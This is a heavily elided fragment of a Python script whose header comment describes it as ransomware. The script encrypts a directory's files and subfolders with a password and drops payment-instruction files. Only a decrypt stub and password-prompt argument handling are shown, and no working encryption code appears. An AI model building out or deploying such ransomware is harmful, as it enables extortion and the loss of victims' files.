...
#This ransomware encrypts the files and child folder of a directory with a password and drops a payment_instruction text files which can be found by searching for "payment_instructions"
...
def decrypt(filename, key):
    ...
    try:
        ...
        print("[!] Invalid Password, You need the correct password to decrypt your files and folders")
        return
    with open(filename, "wb") as file:
...
if __name__ == "__main__":
    ...
    if args.encrypt:
        password = getpass.getpass("Enter the password for encryption: ") #Refer to the password generator app for a secure password!
    elif args.decrypt:
